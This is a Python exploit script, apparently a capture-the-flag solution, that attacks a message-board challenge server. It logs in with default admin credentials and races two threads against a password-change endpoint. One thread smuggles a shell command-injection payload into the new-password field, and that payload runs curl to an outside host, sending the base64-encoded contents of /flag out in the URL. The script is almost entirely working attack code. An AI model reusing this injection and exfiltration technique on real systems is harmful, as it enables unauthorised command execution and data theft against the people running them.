import requests
import threading

HOST = "http://board-board.ctftime.uk:36363/"
session = requests.Session()

# https://youtu.be/_NC_pqMt5rY
def login(session):
    url = HOST + "/admin/login.php"
    data = {
        "username": "admin",
        "password": "admin"
    }
    session.post(url, data=data,)

def change_password(session, new_password, old_password):
    url = HOST + "/admin/ChangePassword"
    data = {
        "oldPassword": old_password,
        "newPassword": new_password
    }
    res = session.post(url, data=data, allow_redirects=False)
    print(res.headers['Location'])

def main():
    sess = requests.Session()
    login(sess)

    threads = []
    NUM_THREADS = 2
    for i in range(NUM_THREADS):
        if i % 2 != 1:
            t = threading.Thread(target=change_password, args=(sess, "a", "whatever"))
        else:
            t = threading.Thread(target=change_password, args=(sess, "';curl https://ching367436.me/`cat /flag|base64`;echo -n '123", "whatever"))
        threads.append(t)
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()